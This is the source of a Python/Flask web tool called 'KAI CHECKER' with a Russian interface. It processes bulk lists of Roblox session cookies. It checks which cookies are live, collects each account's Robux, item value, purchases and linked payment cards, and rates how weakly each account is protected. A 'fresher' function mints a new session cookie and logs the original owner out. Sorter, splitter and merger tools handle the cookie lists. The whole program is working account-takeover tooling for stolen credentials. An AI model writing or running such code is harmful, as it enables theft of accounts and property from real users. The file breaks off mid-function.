import requests, json, time, logging, re, os, urllib3, html, sys, asyncio, zipfile, urllib.parse, io, csv
from typing import Dict, List, Optional
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template_string, request, jsonify, send_file, send_from_directory
from io import BytesIO, StringIO
from curl_cffi.requests import AsyncSession

# ===== НАСТРОЙКИ =====
os.makedirs("data/profiles", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)
os.makedirs("input", exist_ok=True)
os.makedirs("output", exist_ok=True)
os.makedirs("downloads", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()])
logger = logging.getLogger(__name__)
logging.getLogger("urllib3").setLevel(logging.WARNING)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    cffi_requests = None
    HAS_CFFI = False

# ===== СЛОВАРЬ ИГР ДЛЯ КРАТКОГО ОТЧЁТА =====

MAIN_GAMES = {
    "blox fruits", "rivals", "adopt me", "pet sim 99",
    "pets go", "mm2", "brookhaven", "fisch", "king legacy", "gpo",
    "blade ball", "bedwars", "jailbreak", "da hood", "tsb",
    "astd", "anime vanguards", "aot revolution", "aut", "aa", "als",
    "combat warriors", "creatures of sonaria", "driving empire", "evade",
    "ro ghoul", "royale high", "toilet td", "trident survival",
    "war tycoon", "yba", "99 nights", "spongebob td", "fnaf td",
    "garden td", "jujutsu infinite", "jujutsu shenanigans",
    "tds", "volleyball legends", "arsenal", "bee swarm",
    "dress to impress"
}

def is_main_game(game_name: str) -> bool:
    if not game_name:
        return False
    g_lower = game_name.lower().strip()
    for mg in MAIN_GAMES:
        if mg in g_lower or g_lower in mg:
            return True
    return False

# ============================================================
# ФУНКЦИИ
# ============================================================

def create_session(cookie: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'application/json'
    })
    return s

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'PendingRobux': 0, 'OutgoingRobuxYear': 0, 'Created': '?',
        'RegistrationDays': 0, 'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False, 'CardsCount': 0,
        'Country': '?', 'Premium': False, 'Playtime': {}, 'TotalRAP': 0,
        'RareItems': [], 'PurchasedGamepasses': {}, 'TotalInventory': 0,
        'Cookie': cookie, 'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ'
    }
    try:
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json'
        })
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            info['UserID'] = d.get('id')
            info['Username'] = d.get('name')
            info['status'] = '✅'
        elif r.status_code == 401:
            info['status'] = '❌'
            return info
        elif r.status_code == 403:
            info['status'] = '🚫'
            return info
        else:
            return info
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            info['RegistrationDays'] = d.get('AccountAgeInDays', 0)
            info['Premium'] = d.get('IsPremium', False)
            security = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = security.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = security.get('IsPhoneSet', False)

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        td = g(f'https://economy.roblox.com/v2/users/{uid}/transaction-totals?timeFrame=Year&transactionType=summary')
        if td:
            info['PendingRobux'] = td.get('pendingRobuxTotal', 0)
            info['OutgoingRobuxYear'] = td.get('outgoingRobuxTotal', 0)

        cards = g('https://apis.roblox.com/payments-gateway/v1/payment-profiles')
        info['CardsCount'] = len(cards) if isinstance(cards, list) else 0

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            tr = 0
            ri = []
            ir = s.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', verify=False, timeout=10)
            if ir.status_code == 200:
                data = ir.json()
                for item in data.get('data', []):
                    asset_id = item.get('assetId')
                    rap = item.get('recentAveragePrice', 0) or 0
                    tr += rap
                    if rap >= 1000:
                        ri.append({'name': item.get('name', '?'), 'rap': rap})
                info['TotalInventory'] = len(data.get('data', []))
            info['TotalRAP'] = tr
            ri.sort(key=lambda x: x['rap'], reverse=True)
            info['RareItems'] = ri[:10]
        except:
            pass

        # ===== СБОР ГЕЙМПАССОВ =====
        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    item_type = str(details.get('type', ''))
                    price = abs(item.get('currency', {}).get('amount', 0))
                    if price >= 100 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
                        name = details.get('name', 'Товар')
                        place_info = details.get('place', {})
                        place_name = place_info.get('name', 'Неизвестная игра')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            
            info['PurchasedGamepasses'] = gamepasses_dict
        except Exception as e:
            logger.error(f"Gamepass error: {e}")

        security_score = 0
        if info.get('EmailSet'): security_score += 1
        if info.get('TwoFactorEnabled'): security_score += 2
        if info.get('AccountPinEnabled'): security_score += 1
        if info.get('PhoneSet'): security_score += 1

        if security_score >= 4:
            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
        elif security_score >= 2:
            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
        else:
            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
    except Exception as e:
        logger.error(f"Err: {e}")
    return info

# ============================================================
# ФОРМАТИРОВАНИЕ ОТЧЁТА
# ============================================================

def format_short_report(info):
    un = html.escape(str(info.get('Username', '?')))
    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
    status = info.get('status', '⚠️')
    status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
    
    r = f"📋 {un} [{year}]\n"
    r += f"{status_icon} {status_text} | 🆔 {info.get('UserID', '?')}\n\n"
    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '❌ Premium'}\n"
    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💸 Донат: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
    
    rap = info.get('TotalRAP', 0)
    if rap > 0:
        r += f"💎 RAP: ⏣ {rap:,}\n"
    else:
        r += f"💎 RAP: ❌ Нет\n"
    
    r += f"\n🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"   📧 Почта: {'✅' if info.get('EmailSet') else '❌'}\n"
    r += f"   🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"   {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
    r += f"   💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
    
    gp = info.get('PurchasedGamepasses', {})
    main_gp = {game: passes for game, passes in gp.items() if is_main_game(game)}
    
    if main_gp:
        total_sum = sum(sum(p['price'] for p in passes) for passes in main_gp.values())
        r += f"\n📦 ГЕЙМПАССЫ (главные игры):\n"
        for game, passes in list(main_gp.items())[:5]:
            game_total = sum(p['price'] for p in passes)
            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"      └ ...и ещё {len(passes)-5}\n"
    else:
        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет\n"
    
    rare = info.get('RareItems', [])
    if rare:
        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
        for item in rare[:3]:
            r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
    else:
        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
    
    if len(r) > 3800:
        r = r[:3700] + "\n\n<i>[Сообщение сокращено]</i>"
    
    return f"<blockquote>{r}\n\n<code>{info.get('Cookie', '')}</code></blockquote>"

def generate_full_txt_report(info):
    un = info.get('Username', '?')
    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
    status = info.get('status', '⚠️')
    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
    
    r = f"╔══════════════════════════════════════════════════════════╗\n"
    r += f"║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📋 {un} [{year}]\n"
    r += f"║  {status_text} | 🆔 {info.get('UserID', '?')}\n"
    r += f"║  📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
    r += f"║  💸 Донат/год: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
    r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"║  {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
    r += f"║  💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📦 ВСЕ ГЕЙМПАССЫ:\n"
    
    gp = info.get('PurchasedGamepasses', {})
    if gp:
        for game, passes in gp.items():
            game_total = sum(p['price'] for p in passes)
            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"║      └ ...и ещё {len(passes)-5}\n"
    else:
        r += f"║  ❌ Нет геймпассов\n"
    
    rare = info.get('RareItems', [])
    if rare:
        r += f"╠══════════════════════════════════════════════════════════╣\n"
        r += f"║  💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
        for item in rare[:10]:
            r += f"║    └ {item['name']} (⏣ {item['rap']:,})\n"
    
    r += f"╚══════════════════════════════════════════════════════════╝\n\n"
    r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
    return r

def save_txt(info):
    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fn, 'w', encoding='utf-8') as f:
        f.write(generate_full_txt_report(info))
    return fn

# ============================================================
# ФРЕШЕР
# ============================================================

async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    if not HAS_CFFI:
        return False, None, "❌ Установите curl_cffi"
    logs = []
    headers_base = {
        "Cookie": f".ROBLOSECURITY={old_cookie.strip()}",
        "User-Agent": "Mozilla/5.0",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/"
    }
    async with AsyncSession(impersonate="chrome120") as session:
        r_csrf = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=8)
        csrf_token = r_csrf.headers.get("x-csrf-token")
        if not csrf_token:
            return False, None, "❌ Не удалось получить CSRF token"
        ticket_headers = headers_base.copy()
        ticket_headers.update({
            "x-csrf-token": csrf_token,
            "RBXAuthenticationNegotiation": "1",
            "Content-Type": "application/json"
        })
        r_ticket = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=8)
        ticket = r_ticket.headers.get("rbx-authentication-ticket")
        if not ticket:
            return False, None, "❌ Ошибка генерации ticket"
        redeem_headers = {
            "User-Agent": "Roblox/WinInet",
            "RBXAuthenticationNegotiation": "1",
            "Content-Type": "application/json"
        }
        r_redeem = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=redeem_headers, json={"authenticationTicket": ticket}, timeout=8)
        new_cookie = None
        set_cookie_hdr = r_redeem.headers.get("set-cookie", "")
        if ".ROBLOSECURITY=" in set_cookie_hdr:
            parts = set_cookie_hdr.split(".ROBLOSECURITY=")
            if len(parts) > 1:
                new_cookie = parts[1].split(";")[0]
        if not new_cookie or new_cookie == old_cookie:
            return False, None, "❌ Не удалось извлечь новый кук"
        if kill_old:
            await session.post("https://auth.roblox.com/v2/logout", headers=ticket_headers, timeout=4)
            logs.append("✅ Старая сессия инвалидирована")
        else:
            logs.append("ℹ️ Старая сессия сохранена")
        return True, new_cookie, "\n".join(logs)

def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    loop = None
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
        return res
    except Exception as e:
        return False, None, f"[ERROR] {e}"
    finally:
        if loop and not loop.is_closed():
            loop.close()

# ============================================================
# ВЕБ-СЕРВЕР
# ============================================================

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KAI CHECKER</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a14; color: #e0e0e0; font-family: 'Inter', sans-serif; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #1a1a2e; margin-bottom: 25px; }
        .logo-text { font-size: 24px; font-weight: 700; color: #00ff99; }
        .logo-text span { color: #ffaa33; }
        .tabs { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 25px; }
        .tab { padding: 10px 20px; background: #12121f; border: 1px solid #1a1a2e; border-radius: 8px; color: #888; cursor: pointer; font-size: 14px; transition: all 0.2s; user-select: none; }
        .tab:hover { border-color: #00ff99; color: #fff; }
        .tab.active { border-color: #00ff99; color: #00ff99; background: #00ff9910; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .card { background: #12121f; border: 1px solid #1a1a2e; border-radius: 12px; padding: 25px; margin-bottom: 20px; }
        .card h2 { font-size: 18px; font-weight: 600; color: #e0e0e0; margin-bottom: 15px; }
        .upload-area { border: 2px dashed #1a1a2e; border-radius: 8px; padding: 35px; text-align: center; cursor: pointer; transition: all 0.3s; margin-bottom: 15px; }
        .upload-area:hover { border-color: #00ff99; background: #00ff9905; }
        .upload-area.drag-active { border-color: #00ff99 !important; background: #00ff9915 !important; }
        .upload-area p { color: #888; font-size: 14px; pointer-events: none; }
        .upload-area p strong { color: #00ff99; }
        .btn { padding: 10px 24px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
        .btn-primary { background: #00ff99; color: #0a0a14; }
        .btn-primary:hover { background: #00cc77; }
        .btn-success { background: #00cc88; color: #0a0a14; margin-top: 12px; text-decoration: none; display: inline-block; }
        .btn-success:hover { background: #00aa66; }
        .result-box { background: #0a0a14; border: 1px solid #1a1a2e; border-radius: 8px; padding: 15px; margin-top: 15px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #e0e0e0; white-space: pre-wrap; }
        .result-box.success { border-color: #00ff99; }
        .result-box.error { border-color: #ff3355; }
        .result-box code { display: block; word-break: break-all; margin: 10px 0; padding: 10px; background: #12121f; border-radius: 6px; font-size: 12px; color: #00ff99; }
        .footer { text-align: center; padding: 20px 0; color: #555; font-size: 13px; border-top: 1px solid #1a1a2e; margin-top: 30px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo-text">KAI <span>CHECKER</span></div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="validator">✅ Валидатор</div>
        <div class="tab" data-tab="tools">🔧 Инструменты</div>
    </div>

    <!-- ЧЕКЕР -->
    <div class="tab-content active" id="tab-checker">
        <div class="card">
            <h2>🔍 Проверка куков с отчётом (как в Telegram)</h2>
            <div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
            </div>
            <input type="file" id="fullFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runFullcheck()">ЗАПУСТИТЬ ПРОВЕРКУ</button>
            <div class="result-box" id="fullcheckResult"></div>
        </div>
    </div>

    <!-- ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление кука</h2>
            <textarea id="freshInput" placeholder="Вставьте кук для обновления..." style="width:100%;padding:12px;background:#0a0a14;border:1px solid #1a1a2e;border-radius:8px;color:#e0e0e0;font-family:monospace;margin-bottom:15px;resize:vertical;min-height:80px;"></textarea>
            <button class="btn btn-primary" onclick="freshCookie()">ОБНОВИТЬ</button>
            <div class="result-box" id="freshResult"></div>
        </div>
    </div>

    <!-- ВАЛИДАТОР -->
    <div class="tab-content" id="tab-validator">
        <div class="card">
            <h2>✅ Валидатор (отсеивает мёртвые куки)</h2>
            <div class="upload-area" id="validatorArea" onclick="document.getElementById('validatorFile').click()">
                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
            </div>
            <input type="file" id="validatorFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runValidator()">ЗАПУСТИТЬ ВАЛИДАЦИЮ</button>
            <div class="result-box" id="validatorResult"></div>
        </div>
    </div>

    <!-- ИНСТРУМЕНТЫ -->
    <div class="tab-content" id="tab-tools">
        <div class="card">
            <h2>📂 Сортер (разбивает по одному в файл)</h2>
            <div class="upload-area" id="sorterArea" onclick="document.getElementById('sorterFile').click()">
                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
            </div>
            <input type="file" id="sorterFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runSorter()">СОРТИРОВАТЬ</button>
            <div class="result-box" id="sorterResult"></div>
        </div>

        <div class="card">
            <h2>✂️ Разделитель (делит на 5 частей)</h2>
            <div class="upload-area" id="splitArea" onclick="document.getElementById('splitFile').click()">
                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
            </div>
            <input type="file" id="splitFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runSplit()">РАЗДЕЛИТЬ</button>
            <div class="result-box" id="splitResult"></div>
        </div>

        <div class="card">
            <h2>📦 Слияние (объединяет несколько .txt, удаляет дубли)</h2>
            <div class="upload-area" id="mergeArea" onclick="document.getElementById('mergeFile').click()">
                <p>📁 <strong>ЗАГРУЗИТЬ НЕСКОЛЬКО .TXT ФАЙЛОВ</strong></p>
            </div>
            <input type="file" id="mergeFile" accept=".txt" multiple style="display:none;">
            <button class="btn btn-primary" onclick="runMerge()">СЛИТЬ</button>
            <div class="result-box" id="mergeResult"></div>
        </div>
    </div>

    <div class="footer">KAI CHECKER — ВСЕ ФУНКЦИИ В ОДНОМ МЕСТЕ</div>
</div>

<script>
    // ===== ВКЛАДКИ =====
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            this.classList.add('active');
            document.getElementById('tab-' + this.dataset.tab).classList.add('active');
        });
    });

    // ===== DRAG & DROP =====
    document.querySelectorAll('.upload-area').forEach(area => {
        area.addEventListener('dragover', e => { e.preventDefault(); area.classList.add('drag-active'); });
        area.addEventListener('dragleave', () => { area.classList.remove('drag-active'); });
        area.addEventListener('drop', e => {
            e.preventDefault();
            area.classList.remove('drag-active');
            const files = e.dataTransfer.files;
            const input = area.parentElement.querySelector('input[type="file"]');
            if (input) { input.files = files; input.dispatchEvent(new Event('change')); }
        });
    });

    // ===== ЧЕКЕР =====
    async function runFullcheck() {
        const fileInput = document.getElementById('fullFile');
        const resBox = document.getElementById('fullcheckResult');
        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
        const formData = new FormData();
        formData.append('file', fileInput.files[0]);
        resBox.textContent = '⏳ Проверка...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/fullcheck', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `<span class="valid">✅ Проверено: ${data.total}</span>\n`;
                html += `<span class="info">📦 Геймпассов: ${data.total_gamepasses}</span>\n`;
                html += `<span class="info">💎 RAP: ${data.total_rap}</span>\n\n`;
                if (data.reports) {
                    html += `<b>📋 КРАТКИЕ ОТЧЁТЫ:</b>\n`;
                    for (const report of data.reports) {
                        html += `\n${report}\n─────────────────\n`;
                    }
                }
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ПОЛНЫЕ ОТЧЁТЫ (ZIP)</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = 'Ошибка: ' + e;
        }
    }

    // ===== ФРЕШЕР =====
    async function freshCookie() {
        const input = document.getElementById('freshInput');
        const resBox = document.getElementById('freshResult');
        const cookie = input.value.trim();
        if (!cookie) { resBox.textContent = '❌ Введите кук!'; resBox.className = 'result-box error'; return; }
        resBox.textContent = '⏳ Обновление...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/fresh', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie })
            });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                resBox.innerHTML = `<span class="valid">✅ Обновлено!</span>\n<code>${data.new_cookie}</code>`;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = '❌ ' + data.log;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = 'Ошибка: ' + e;
        }
    }

    // ===== ВАЛИДАТОР =====
    async function runValidator() {
        const fileInput = document.getElementById('validatorFile');
        const resBox = document.getElementById('validatorResult');
        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
        const formData = new FormData();
        formData.append('file', fileInput.files[0]);
        resBox.textContent = '⏳ Валидация...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/validate', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `<span class="valid">✅ Валидных: ${data.valid}</span>\n`;
                html += `<span class="invalid">❌ Невалидных: ${data.invalid}</span>\n`;
                html += `<span class="info">📊 Всего: ${data.total}</span>`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ВАЛИДНЫЕ</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = 'Ошибка: ' + e;
        }
    }

    // ===== СОРТЕР =====
    async function runSorter() {
        const fileInput = document.getElementById('sorterFile');
        const resBox = document.getElementById('sorterResult');
        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
        const formData = new FormData();
        formData.append('file', fileInput.files[0]);
        resBox.textContent = '⏳ Сортировка...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/sorter', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `<span class="valid">✅ Сортировка завершена!</span>\n`;
                html += `<span class="info">📦 Куков: ${data.total}</span>`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ZIP</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = 'Ошибка: ' + e;
        }
    }

    // ===== РАЗДЕЛИТЕЛЬ =====
    async function runSplit() {
        const fileInput = document.getElementById('splitFile');
        const resBox = document.getElementById('splitResult');
        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
        const formData = new FormData();
        formData.append('file', fileInput.files[0]);
        resBox.textContent = '⏳ Разделение...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/split', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `<span class="valid">✅ Разделение завершено!</span>\n`;
                html += `<span class="info">📦 Куков: ${data.total}</span>`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ZIP</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = 'Ошибка: ' + e;
        }
    }

    // ===== СЛИЯНИЕ =====
    async function runMerge() {
        const fileInput = document.getElementById('mergeFile');
        const resBox = document.getElementById('mergeResult');
        if (fileInput.files.length < 2) { alert('Выберите минимум 2 файла!'); return; }
        const formData = new FormData();
        for (let f of fileInput.files) {
            formData.append('files', f);
        }
        resBox.textContent = '⏳ Слияние...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/merge', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `<span class="valid">✅ Слияние завершено!</span>\n`;
                html += `<span class="info">📦 Куков: ${data.total}</span>\n`;
                html += `<span class="valid">🔄 Дублей удалено: ${data.duplicates}</span>`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = 'Ошибка: ' + e;
        }
    }
</script>
</body>
</html>
"""

# ============================================================
# API
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

# ===== ЧЕКЕР =====
@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    
    file = request.files['file']
    content = file.read().decode('utf-8', errors='ignore')
    
    cookies = []
    for line in content.split('\n'):
        line = line.strip()
        if '_|WARNING' in line and len(line) > 100:
            cookies.append(line)
        elif '.ROBLOSECURITY' in line and len(line) > 100:
            cookies.append(line)
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    reports_data = []
    total_gamepasses = 0
    total_rap = 0
    short_reports = []
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    for c in cookies[:10]:
        info = get_full_info(c)
        if info['status'] == '✅':
            reports_data.append(info)
            total_gamepasses += len(info.get('PurchasedGamepasses', {}))
            total_rap += info.get('TotalRAP', 0)
            short_reports.append(format_short_report(info))
    
    if not reports_data:
        return jsonify({"success": False, "message": "Нет валидных аккаунтов"})
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for info in reports_data:
            zf.writestr(f"{info.get('Username', 'account')}.txt", generate_full_txt_report(info))
    zip_buffer.seek(0)
    
    filename = f"full_reports_{timestamp}.zip"
    with open(f"downloads/{filename}", 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "total_gamepasses": total_gamepasses,
        "total_rap": total_rap,
        "reports": short_reports,
        "download_url": f"/downloads/{filename}"
    })

# ===== ФРЕШЕР =====
@app.route("/api/fresh", methods=["POST"])
def api_fresh():
    data = request.json
    cookie = data.get('cookie', '')
    ok, new_cookie, log_text = refresh_cookie_sync(cookie)
